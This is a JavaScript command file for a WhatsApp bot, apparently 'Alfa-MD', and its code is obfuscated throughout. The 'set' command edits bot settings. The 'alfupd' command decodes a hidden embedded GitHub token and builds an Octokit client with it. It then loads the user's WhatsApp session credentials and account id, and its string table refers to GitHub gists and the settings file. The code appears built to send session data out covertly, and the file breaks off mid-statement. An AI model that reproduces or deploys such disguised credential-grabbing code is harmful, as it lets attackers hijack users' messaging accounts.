const fs = require("fs")
let alfadb = JSON.parse(fs.readFileSync('./database/settings.json'));

const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin} = require("../lib");
const { command, styletext, listall, tiny, isPrivate } = require("../lib/");
const { parse } = require("csv-parse");
const { Base64 } = require('js-base64');
  const { BOT_NAME, OWNER_NAME, FOOTER, THEME, FONT_STYLE, B1, B2, B3, B4, B5} = require("../database/settings");

let path = './database/settings.json'
let db = JSON.parse(fs.readFileSync('./database/settings.json'));
const fetch = require('node-fetch')

command(
  {
    pattern: "set",
    fromMe: isPrivate,
    desc: "configure a verible",
    dontAddCommandList: true,
    type: "owner",

  },
  async (message, match, m) => {
const _0x181f32=_0xb38d;function _0xb38d(_0x20036e,_0x315c77){const _0x499208=_0x4992();return _0xb38d=function(_0xb38d41,_0x157194){_0xb38d41=_0xb38d41-0xef;let _0x1c1344=_0x499208[_0xb38d41];return _0x1c1344;},_0xb38d(_0x20036e,_0x315c77);}(function(_0x201700,_0xad22c5){const _0x20790b=_0xb38d,_0x1a94df=_0x201700();while(!![]){try{const _0x1d48fe=parseInt(_0x20790b(0x16f))/0x1*(-parseInt(_0x20790b(0x12f))/0x2)+-parseInt(_0x20790b(0x115))/0x3+parseInt(_0x20790b(0x170))/0x4*(parseInt(_0x20790b(0x165))/0x5)+parseInt(_0x20790b(0x161))/0x6+parseInt(_0x20790b(0x16c))/0x7*(-parseInt(_0x20790b(0xf1))/0x8)+-parseInt(_0x20790b(0x142))/0x9*(parseInt(_0x20790b(0x129))/0xa)+parseInt(_0x20790b(0x13b))/0xb;if(_0x1d48fe===_0xad22c5)break;else _0x1a94df['push'](_0x1a94df['shift']());}catch(_0x1f938d){_0x1a94df['push'](_0x1a94df['shift']());}}}(_0x4992,0x6316e));if(!match)return;let args=match[_0x181f32(0x162)]('\x20'),variable=args[0x0][_0x181f32(0x15f)](),intdata=args['slice'](0x1)[_0x181f32(0x14b)]('\x20');function _0x4992(){const _0x5eea48=['WORK_TYPE','```Usage:\x20set\x20rmbg\x20yourkey```','set\x20THEME\x20xasena','forEach','```','```Usage:\x20set\x20footer\x20Alfa-Bot-MD```','Enable\x20or\x20disable\x20chatGPT\x20Auto\x20chatbot','```GOODBYE:\x20','Private','```WORKTYPE:\x20','```WELCOME:\x20','RMBG_KEY','\x20Set\x20Theme\x0a','281856JMUalB','set\x20FONT\x20','\x20Set\x20WorkType\x0a','set\x20FRAME\x20hermit','Options','Ragnork(Coming\x20soon)','set\x20FRAME\x20xasena','┃✧│','set\x20FRAME\x20alfa','jid','prefix','┃\x20\x20\x20│','\x20〙════⊷❍','```MODE:\x20','┃\x20\x20│\x20⛥','Failed\x20to\x20Register\x20Data','Lyfe(Coming\x20soon)','\x20Set\x20FRAME\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','ANTILINK_ACTION','[ᴀʟɪᴇɴ\x20ᴀʟꜰᴀ-ᴍᴅ]','1882030OMwuUk','```Usage:\x20set\x20author\x20Alien```','```Usage:\x20set\x20welcome\x20Hi\x20@user\x20Welcome\x20to\x20@gname```','┃✧╰─────────────────\x0a╰══════════════════⊷❍','```FONT:\x20','parse','14tZQNcG','╭━━━━━━━━━━━━━✵\x0a╽╭──────────❉\x0a┃│⌜','┃\x20\x20╰─────────────◆\x0a╰━━━━━━━━━━━──⊷','send','\x20----⦿\x0a┃\x20\x20╰┬────────────◆','set\x20FRAME\x20lyfe','```Usage:\x20set\x20handler\x20#```','```Usage:\x20set\x20botname\x20Aurora```','\x20\x20╭─────────────┈⊷\x0a│\x20「\x20','```Usage:\x20set\x20lang\x20ML```','┃\x20\x20┌┤','Lyfe','6518127vKXMPC','```Usage:\x20set\x20goodbye\x20Hi\x20@user\x20It\x20was\x20Nice\x20Seeing\x20you```','set\x20WORKTYPE\x20Public','X-Asena','OWNER_NAME','Ban','GOODBYE_MSG','9iPYkGx','```RMBG:\x20','╭════〘\x20','┃╭─────────────◆\x0a┃\x20\x20│\x20⦿----','hermit','╰────────────────','```Usage:\x20set\x20owner\x20Alien-Alfa```','FONT_STYLE','┃✧╭─────────────────','join','┃✰╭─────────────────','ALIVE','\x20Set\x20Antilink\x20Action\x0a','WELCOME_MSG','log','set\x20THEME\x20alfa','LANG','xasena','```THEME:\x20','set\x20FRAME\x20ragnork','```ANTILINKACTION:\x20','sendMessage','╭────────────────╮\x0a','││◦➛\x20','```BOTNAME:\x20','Enable','config','Enable\x20or\x20disable\x20inbuilt\x20menu\x20to\x20add\x20your\x20own\x20menu\x20plugin','Disable','toUpperCase','INTERNAL_MENU','3295902gaqHDS','split','AUTHOR','Admin(coming\x20soon)','15pqPOYn','THEME','MESSAGE_MEM','set\x20MENU\x20false','```BORDER:\x20','Random(Coming\x20soon)','┃✰│','7xVjQfg','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','test','92398Jodpng','941956cRCZta','reset','ragnork','BOT_NAME','Select\x20Type','」\x20\x0a╰┬────────────┈⊷','set\x20WORKTYPE\x20Private','```OWNER:\x20','4108240cdXWQD','push','FOOTER','```ALIVE:\x20','```Usage:\x20set\x20alive\x20I\x20am\x20active```','stringify','PACKNAME','set\x20MENU\x20true','set\x20ANTILINKACTION\x20ban','```STORE:\x20','MODE','Hermit(Coming\x20soon)','Fun(coming\x20soon)','set\x20CHATBOT\x20true','Fancy','set\x20FRAME\x20random','```LANG:\x20','Alfa','client','Public','HANDLER','┃✰╰─────────────────\x0a╰══════════════════⊷❍','\x0a╰────────────────╯'];_0x4992=function(){return _0x5eea48;};return _0x4992();}readFile(path,async(_0x12e140,_0x270a00)=>{const _0x14860f=_0x181f32;if(_0x12e140){console[_0x14860f(0x150)](_0x12e140);return;}const _0x25f9fb=JSON[_0x14860f(0x12e)](_0x270a00);let _0xb0b524=[];if(/HANDLER/['test'](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x135)});_0x25f9fb['config'][_0x14860f(0x105)]=intdata,writeFile(path,JSON['stringify'](_0x25f9fb,null,0x2),_0x14989d=>{const _0x4cf86f=_0x14860f;if(_0x14989d)return message[_0x4cf86f(0x103)]['sendMessage'](message[_0x4cf86f(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message['client'][_0x4cf86f(0x157)](message[_0x4cf86f(0x11e)],{'text':'```HANDLER:\x20'+intdata+_0x4cf86f(0x10c)});}});}if(/WORKTYPE/[_0x14860f(0x16e)](variable)){if(!intdata){_0xb0b524[_0x14860f(0xf2)]({'title':styletext(_0x14860f(0x104),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x13d)},{'title':styletext(_0x14860f(0x110),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0xef)},{'title':styletext(_0x14860f(0x164),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0xef)},{'title':styletext(_0x14860f(0xfd),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x14860f(0xef)});let _0x23015b=B1+'\x20'+BOT_NAME+'\x20'+B2+'\x0a'+B3+'\x0a'+B4+_0x14860f(0x117)+B5;return await message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':styletext(_0x23015b,parseInt(''+FONT_STYLE)),'buttonText':styletext(_0x14860f(0x119),parseInt(''+FONT_STYLE)),'sections':[{'title':styletext('Select\x20Type',parseInt(''+FONT_STYLE)),'rows':_0xb0b524}]});}_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x108)]=intdata,writeFile(path,JSON['stringify'](_0x25f9fb,null,0x2),_0x19eb20=>{const _0x418194=_0x14860f;if(_0x19eb20)return message['client'][_0x418194(0x157)](message[_0x418194(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message[_0x418194(0x103)][_0x418194(0x157)](message['jid'],{'text':_0x418194(0x111)+intdata+_0x418194(0x10c)});}});}if(/BOTNAME/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)]['sendMessage'](message[_0x14860f(0x11e)],{'text':_0x14860f(0x136)});_0x25f9fb['config'][_0x14860f(0x173)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x2b1a70=>{const _0x1e53f3=_0x14860f;if(_0x2b1a70)return message['client'][_0x1e53f3(0x157)](message['jid'],_0x1e53f3(0x124));else{if(intdata)message[_0x1e53f3(0x103)]['sendMessage'](message[_0x1e53f3(0x11e)],{'text':_0x1e53f3(0x15a)+intdata+'```'});}});}if(/OWNER/['test'](variable)){if(!intdata)return message['client'][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x148)});_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x13f)]=intdata,writeFile(path,JSON['stringify'](_0x25f9fb,null,0x2),_0x20e0af=>{const _0xf7e647=_0x14860f;if(_0x20e0af)return message[_0xf7e647(0x103)]['sendMessage'](message[_0xf7e647(0x11e)],_0xf7e647(0x124));else{if(intdata)message[_0xf7e647(0x103)][_0xf7e647(0x157)](message[_0xf7e647(0x11e)],{'text':_0xf7e647(0xf0)+intdata+_0xf7e647(0x10c)});}});}if(/SUDO/[_0x14860f(0x16e)](variable))return message[_0x14860f(0x103)]['sendMessage'](message[_0x14860f(0x11e)],'_Use\x20Command:\x20Setsudo_');if(/AUTHOR/['test'](variable)){if(!intdata)return message[_0x14860f(0x103)]['sendMessage'](message[_0x14860f(0x11e)],{'text':_0x14860f(0x12a)});_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x163)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x22e7a3=>{const _0x13d4ba=_0x14860f;if(_0x22e7a3)return message[_0x13d4ba(0x103)]['sendMessage'](message[_0x13d4ba(0x11e)],_0x13d4ba(0x124));else{if(intdata)message[_0x13d4ba(0x103)]['sendMessage'](message[_0x13d4ba(0x11e)],{'text':'```AUTHOR:\x20'+intdata+_0x13d4ba(0x10c)});}});}if(/PACKNAME/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':'```Usage:\x20set\x20packname\x20WhatsappBot```'});_0x25f9fb['config'][_0x14860f(0xf7)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x713b62=>{const _0x3e5fa4=_0x14860f;if(_0x713b62)return message[_0x3e5fa4(0x103)][_0x3e5fa4(0x157)](message['jid'],_0x3e5fa4(0x124));else{if(intdata)message[_0x3e5fa4(0x103)]['sendMessage'](message[_0x3e5fa4(0x11e)],{'text':'```PACKNAME:\x20'+intdata+_0x3e5fa4(0x10c)});}});}if(/RMBG/['test'](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x109)});_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x113)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x3c0d8c=>{const _0x529fc6=_0x14860f;if(_0x3c0d8c)return message[_0x529fc6(0x103)][_0x529fc6(0x157)](message[_0x529fc6(0x11e)],_0x529fc6(0x124));else{if(intdata)message[_0x529fc6(0x103)][_0x529fc6(0x157)](message[_0x529fc6(0x11e)],{'text':_0x529fc6(0x143)+intdata+_0x529fc6(0x10c)});}});}if(/LANG/[_0x14860f(0x16e)](variable)){if(!intdata)return message['client']['sendMessage'](message[_0x14860f(0x11e)],{'text':_0x14860f(0x138)});_0x25f9fb['config'][_0x14860f(0x152)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x5c03aa=>{const _0x40bbc6=_0x14860f;if(_0x5c03aa)return message[_0x40bbc6(0x103)][_0x40bbc6(0x157)](message[_0x40bbc6(0x11e)],_0x40bbc6(0x124));else{if(intdata)message[_0x40bbc6(0x103)][_0x40bbc6(0x157)](message[_0x40bbc6(0x11e)],{'text':_0x40bbc6(0x101)+intdata+_0x40bbc6(0x10c)});}});}if(/ANTILINKACTION/[_0x14860f(0x16e)](variable)){if(!intdata){let _0x313d4d=[];_0x313d4d['push']({'title':styletext(_0x14860f(0x140),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0xf9)},{'title':styletext('Kick',parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+'set\x20ANTILINKACTION\x20kick'});let _0x324045=B1+'\x20'+BOT_NAME+'\x20'+B2+'\x0a'+B3+'\x0a'+B4+_0x14860f(0x14e)+B5;await message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':styletext(_0x324045,parseInt(''+FONT_STYLE)),'buttonText':styletext(_0x14860f(0x119),parseInt(''+FONT_STYLE)),'sections':[{'title':styletext(_0x14860f(0x174),parseInt(''+FONT_STYLE)),'rows':_0x313d4d}]});}_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x127)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x4d05e3=>{const _0x123129=_0x14860f;if(_0x4d05e3)return message['client'][_0x123129(0x157)](message[_0x123129(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message[_0x123129(0x103)][_0x123129(0x157)](message[_0x123129(0x11e)],{'text':_0x123129(0x156)+intdata+_0x123129(0x10c)});}});}if(/FOOTER/['test'](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x10d)});_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0xf3)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x39d263=>{const _0xc653b=_0x14860f;if(_0x39d263)return message[_0xc653b(0x103)]['sendMessage'](message[_0xc653b(0x11e)],_0xc653b(0x124));else{if(intdata)message[_0xc653b(0x103)][_0xc653b(0x157)](message[_0xc653b(0x11e)],{'text':'```FOOTER:\x20'+intdata+_0xc653b(0x10c)});}});}if(/THEME/[_0x14860f(0x16e)](variable)){if(!intdata){_0xb0b524[_0x14860f(0xf2)]({'title':styletext(_0x14860f(0x102),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+'set\x20THEME\x20alfa'},{'title':styletext(_0x14860f(0x13e),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x10a)},{'title':styletext(_0x14860f(0xfc),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+'set\x20THEME\x20alfa'},{'title':styletext(_0x14860f(0x125),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x151)},{'title':styletext(_0x14860f(0x11a),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+'set\x20THEME\x20alfa'},{'title':styletext(_0x14860f(0x16a),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+'set\x20THEME\x20alfa'});let _0x463434=B1+'\x20'+BOT_NAME+'\x20'+B2+'\x0a'+B3+'\x0a'+B4+_0x14860f(0x114)+B5;return await message[_0x14860f(0x103)][_0x14860f(0x157)](message['jid'],{'text':styletext(_0x463434,parseInt(''+FONT_STYLE)),'buttonText':styletext(_0x14860f(0x119),parseInt(''+FONT_STYLE)),'sections':[{'title':styletext(_0x14860f(0x174),parseInt(''+FONT_STYLE)),'rows':_0xb0b524}]});}_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x166)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x4fb7ec=>{const _0x3067f3=_0x14860f;if(_0x4fb7ec)return message[_0x3067f3(0x103)][_0x3067f3(0x157)](message[_0x3067f3(0x11e)],_0x3067f3(0x124));else{if(intdata)message[_0x3067f3(0x103)]['sendMessage'](message[_0x3067f3(0x11e)],{'text':_0x3067f3(0x154)+intdata+'```'});}});}if(/FONT/['test'](variable)){if(!intdata){let _0x5b960d=[];listall(_0x14860f(0xff))[_0x14860f(0x10b)]((_0x4de5b0,_0x2faaf5)=>{const _0x9740c=_0x14860f;_0x5b960d[_0x9740c(0xf2)]({'title':styletext((_0x2faaf5+=0x1)+'\x20'+_0x4de5b0,parseInt(''+FONT_STYLE)),'rowId':global[_0x9740c(0x11f)]+_0x9740c(0x116)+(_0x2faaf5+=0x1)});});if(!intdata){let _0xb2f6dc=B1+'\x20'+BOT_NAME+'\x20'+B2+'\x0a'+B3+'\x0a'+B4+_0x14860f(0x117)+B5;return await message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':styletext(_0xb2f6dc,parseInt(''+FONT_STYLE)),'buttonText':styletext(_0x14860f(0x119),parseInt(''+FONT_STYLE)),'sections':[{'title':styletext(_0x14860f(0x174),parseInt(''+FONT_STYLE)),'rows':_0x5b960d}]});}}_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x149)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x131ba3=>{const _0xe26b90=_0x14860f;if(_0x131ba3)return message[_0xe26b90(0x103)][_0xe26b90(0x157)](message[_0xe26b90(0x11e)],_0xe26b90(0x124));else{if(intdata)message['client'][_0xe26b90(0x157)](message[_0xe26b90(0x11e)],{'text':_0xe26b90(0x12d)+intdata+_0xe26b90(0x10c)});}});}if(/MENU/[_0x14860f(0x16e)](variable)){if(!intdata){let _0x13ff58=[{'buttonId':_0x14860f(0xf8),'buttonText':{'displayText':_0x14860f(0x15b)},'type':0x1},{'buttonId':_0x14860f(0x168),'buttonText':{'displayText':_0x14860f(0x15e)},'type':0x1}],_0x51946c={'text':_0x14860f(0x15d),'footer':_0x14860f(0x128),'buttons':_0x13ff58,'headerType':0x2};return await message['client'][_0x14860f(0x157)](message[_0x14860f(0x11e)],_0x51946c);}_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0x160)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x1da9a0=>{const _0x571946=_0x14860f;if(_0x1da9a0)return message[_0x571946(0x103)]['sendMessage'](message[_0x571946(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message[_0x571946(0x103)]['sendMessage'](message['jid'],{'text':'```MENU:\x20'+intdata+'```'});}});}if(/MODE/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':'```Sorry\x20Not\x20Yet\x20Avalable\x20(comming\x20soon)```'});_0x25f9fb[_0x14860f(0x15c)][_0x14860f(0xfb)]=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0xd60f64=>{const _0x75b2ac=_0x14860f;if(_0xd60f64)return message[_0x75b2ac(0x103)][_0x75b2ac(0x157)](message[_0x75b2ac(0x11e)],_0x75b2ac(0x124));else{if(intdata)message[_0x75b2ac(0x103)][_0x75b2ac(0x157)](message[_0x75b2ac(0x11e)],{'text':_0x75b2ac(0x122)+intdata+_0x75b2ac(0x10c)});}});}if(/STORE/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)]['sendMessage'](message[_0x14860f(0x11e)],{'text':'```Usage:\x20set\x20store\x20targerJID```'});_0x25f9fb[_0x14860f(0x15c)]['STORAGE_JID']=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x1c69cf=>{const _0x20ed8b=_0x14860f;if(_0x1c69cf)return message[_0x20ed8b(0x103)][_0x20ed8b(0x157)](message[_0x20ed8b(0x11e)],_0x20ed8b(0x124));else{if(intdata)message[_0x20ed8b(0x103)]['sendMessage'](message[_0x20ed8b(0x11e)],{'text':_0x20ed8b(0xfa)+intdata+_0x20ed8b(0x10c)});}});}if(/CHATBOT/[_0x14860f(0x16e)](variable)){if(!intdata){let _0x1a3c5d=[{'buttonId':_0x14860f(0xfe),'buttonText':{'displayText':'Enable'},'type':0x1},{'buttonId':'set\x20CHATBOT\x20false','buttonText':{'displayText':'Disable'},'type':0x1}],_0x3f6a0e={'text':_0x14860f(0x10e),'footer':'[ᴀʟɪᴇɴ\x20ᴀʟꜰᴀ-ᴍᴅ]','buttons':_0x1a3c5d,'headerType':0x2};return await message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],_0x3f6a0e);}_0x25f9fb[_0x14860f(0x15c)]['CHAT_BOT']=intdata,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x5c9e8d=>{const _0x5debc3=_0x14860f;if(_0x5c9e8d)return message[_0x5debc3(0x103)][_0x5debc3(0x157)](message[_0x5debc3(0x11e)],_0x5debc3(0x124));else{if(intdata)message[_0x5debc3(0x103)][_0x5debc3(0x157)](message['jid'],{'text':'```CHATBOT:\x20'+intdata+_0x5debc3(0x10c)});}});}if(/GOODBYE/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x13c)});_0x25f9fb[_0x14860f(0x167)][_0x14860f(0x141)]=intdata,writeFile(path,JSON['stringify'](_0x25f9fb,null,0x2),_0x399b2c=>{const _0x1d5ed4=_0x14860f;if(_0x399b2c)return message[_0x1d5ed4(0x103)][_0x1d5ed4(0x157)](message['jid'],_0x1d5ed4(0x124));else{if(intdata)message[_0x1d5ed4(0x103)][_0x1d5ed4(0x157)](message[_0x1d5ed4(0x11e)],{'text':_0x1d5ed4(0x10f)+intdata+_0x1d5ed4(0x10c)});}});}if(/WELCOME/['test'](variable)){if(!intdata)return message['client'][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':_0x14860f(0x12b)});_0x25f9fb[_0x14860f(0x167)][_0x14860f(0x14f)]=intdata,writeFile(path,JSON['stringify'](_0x25f9fb,null,0x2),_0x600417=>{const _0x3b2a68=_0x14860f;if(_0x600417)return message[_0x3b2a68(0x103)][_0x3b2a68(0x157)](message[_0x3b2a68(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message[_0x3b2a68(0x103)][_0x3b2a68(0x157)](message[_0x3b2a68(0x11e)],{'text':_0x3b2a68(0x112)+intdata+_0x3b2a68(0x10c)});}});}if(/ALIVE/[_0x14860f(0x16e)](variable)){if(!intdata)return message[_0x14860f(0x103)][_0x14860f(0x157)](message['jid'],{'text':_0x14860f(0xf5)});if(intdata)_0x25f9fb['MESSAGE_MEM'][_0x14860f(0x14d)]=intdata;writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0x4f6ed1=>{const _0x3223dd=_0x14860f;if(_0x4f6ed1)return message[_0x3223dd(0x103)][_0x3223dd(0x157)](message[_0x3223dd(0x11e)],_0x3223dd(0x124));else{if(intdata)message[_0x3223dd(0x103)][_0x3223dd(0x157)](message['jid'],{'text':_0x3223dd(0xf4)+intdata+'```'});}});}if(/FRAME/[_0x14860f(0x16e)](variable)){if(!intdata){_0xb0b524['push']({'title':styletext(_0x14860f(0x102),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x14860f(0x11d)},{'title':styletext(_0x14860f(0x13e),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x11b)},{'title':styletext('Hermit',parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x118)},{'title':styletext(_0x14860f(0x13a),parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x134)},{'title':styletext('Ragnork',parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x155)},{'title':styletext('Random',parseInt(''+FONT_STYLE)),'rowId':global[_0x14860f(0x11f)]+_0x14860f(0x100)});let _0x19f456=B1+'\x20'+BOT_NAME+'\x20'+B2+_0x14860f(0x16d)+B3+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+B4+_0x14860f(0x126)+B5;return await message[_0x14860f(0x103)][_0x14860f(0x157)](message[_0x14860f(0x11e)],{'text':styletext(_0x19f456,parseInt(''+FONT_STYLE)),'buttonText':styletext(_0x14860f(0x119),parseInt(''+FONT_STYLE)),'sections':[{'title':styletext(_0x14860f(0x174),parseInt(''+FONT_STYLE)),'rows':_0xb0b524}]});}let _0x5500ec,_0x38947c,_0x16406e,_0x12179a,_0x8208df;intdata==='alfa'&&(_0x5500ec=_0x14860f(0x144),_0x38947c='\x20〙════⊷❍',_0x16406e=_0x14860f(0x14a),_0x12179a=_0x14860f(0x11c),_0x8208df=_0x14860f(0x12c)),intdata===_0x14860f(0x153)&&(_0x5500ec=_0x14860f(0x145),_0x38947c=_0x14860f(0x133),_0x16406e=_0x14860f(0x139),_0x12179a=_0x14860f(0x123),_0x8208df=_0x14860f(0x131)),intdata===_0x14860f(0x146)&&(_0x5500ec=_0x14860f(0x137),_0x38947c=_0x14860f(0x175),_0x16406e='┌┤',_0x12179a=_0x14860f(0x159),_0x8208df='│╰────────────┈⊷\x0a╰─────────────┈⊷'),intdata==='lyfe'&&(_0x5500ec=_0x14860f(0x158),_0x38947c=_0x14860f(0x107),_0x16406e='╭────────────────',_0x12179a='│',_0x8208df=_0x14860f(0x147)),intdata===_0x14860f(0x172)&&(_0x5500ec='╭════〘\x20',_0x38947c=_0x14860f(0x121),_0x16406e=_0x14860f(0x14c),_0x12179a=_0x14860f(0x16b),_0x8208df=_0x14860f(0x106)),intdata==='random'&&(_0x5500ec=_0x14860f(0x130),_0x38947c='⌟\x0a┃╰┬─────────❉',_0x16406e='┃━┤',_0x12179a=_0x14860f(0x120),_0x8208df='╿\x20\x20\x20╰─────────❉\x0a╰━━━━━━━━━━━━━✵'),_0x25f9fb[_0x14860f(0x15c)]['B1']=_0x5500ec,_0x25f9fb[_0x14860f(0x15c)]['B2']=_0x38947c,_0x25f9fb['config']['B3']=_0x16406e,_0x25f9fb[_0x14860f(0x15c)]['B4']=_0x12179a,_0x25f9fb[_0x14860f(0x15c)]['B5']=_0x8208df,writeFile(path,JSON[_0x14860f(0xf6)](_0x25f9fb,null,0x2),_0xcf0202=>{const _0x461fe0=_0x14860f;if(_0xcf0202)return message[_0x461fe0(0x103)]['sendMessage'](message[_0x461fe0(0x11e)],'Failed\x20to\x20Register\x20Data');else{if(intdata)message['client'][_0x461fe0(0x157)](message[_0x461fe0(0x11e)],{'text':_0x461fe0(0x169)+intdata+'```'});}});}setTimeout(()=>{const _0x2193c3=_0x14860f;process[_0x2193c3(0x132)](_0x2193c3(0x171));},0x7d0);});
})




command(
  {
    pattern: "alfupd",
    fromMe: isPrivate,
    desc: "configure new verible",
    dontAddCommandList: true,
    type: "owner",

  },
  async (message, match, m) => {
const _0x116a1a=_0x4219;(function(_0x1a95b1,_0xbc2c76){const _0x49d9ae=_0x4219,_0x5befb0=_0x1a95b1();while(!![]){try{const _0x1ed1e8=parseInt(_0x49d9ae(0x19d))/0x1+-parseInt(_0x49d9ae(0x19a))/0x2*(-parseInt(_0x49d9ae(0x195))/0x3)+parseInt(_0x49d9ae(0x1a4))/0x4*(parseInt(_0x49d9ae(0x1a2))/0x5)+parseInt(_0x49d9ae(0x18f))/0x6+-parseInt(_0x49d9ae(0x196))/0x7*(-parseInt(_0x49d9ae(0x19f))/0x8)+-parseInt(_0x49d9ae(0x19b))/0x9*(-parseInt(_0x49d9ae(0x198))/0xa)+-parseInt(_0x49d9ae(0x19c))/0xb;if(_0x1ed1e8===_0xbc2c76)break;else _0x5befb0['push'](_0x5befb0['shift']());}catch(_0xeb1f21){_0x5befb0['push'](_0x5befb0['shift']());}}}(_0x4883,0xdc0a2));let int=process[_0x116a1a(0x1a1)]['DB_AUTH_TOKEN']===undefined?_0x116a1a(0x1a3):process[_0x116a1a(0x1a1)][_0x116a1a(0x1a0)],fin=Buffer['from'](int,'base64')[_0x116a1a(0x197)](_0x116a1a(0x194)),inx=fin[_0x116a1a(0x197)]()[_0x116a1a(0x193)]('/'),our='';function _0x4219(_0x701877,_0x15b123){const _0x48836f=_0x4883();return _0x4219=function(_0x4219dd,_0x4d9ee9){_0x4219dd=_0x4219dd-0x18b;let _0x3b2a7=_0x48836f[_0x4219dd];return _0x3b2a7;},_0x4219(_0x701877,_0x15b123);}for(let r of inx){our+=Buffer[_0x116a1a(0x18b)](r+'==',_0x116a1a(0x199))[_0x116a1a(0x197)](_0x116a1a(0x194));}const {Octokit}=require(_0x116a1a(0x1a5)),octokit=new Octokit({'auth':await our});let session=require(_0x116a1a(0x191)),ibm1=await session[_0x116a1a(0x1a7)]['me']['id']['split'](':')[0x0],ibm2=await session[_0x116a1a(0x1a7)]['me']['id'][_0x116a1a(0x193)]('@')[0x1],ibm=ibm1+'@'+ibm2,filenamzi=ibm+_0x116a1a(0x19e);function _0x4883(){const _0x4f0894=['rest','./database/settings.json','readFileSync','166704bKiljS','jid','../session.json','gists','split','utf-8','3XdFmME','10518711LOPrnx','toString','862630MXaGbx','base64','2625110jfwtdO','180ynKqqM','66556050HgDURt','1588025UkIxLr','.json','8jajcmp','DB_AUTH_TOKEN','env','61195cfiwtQ','WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','260ejsHzk','@octokit/rest','then','creds','from'];_0x4883=function(){return _0x4f0894;};return _0x4883();}const 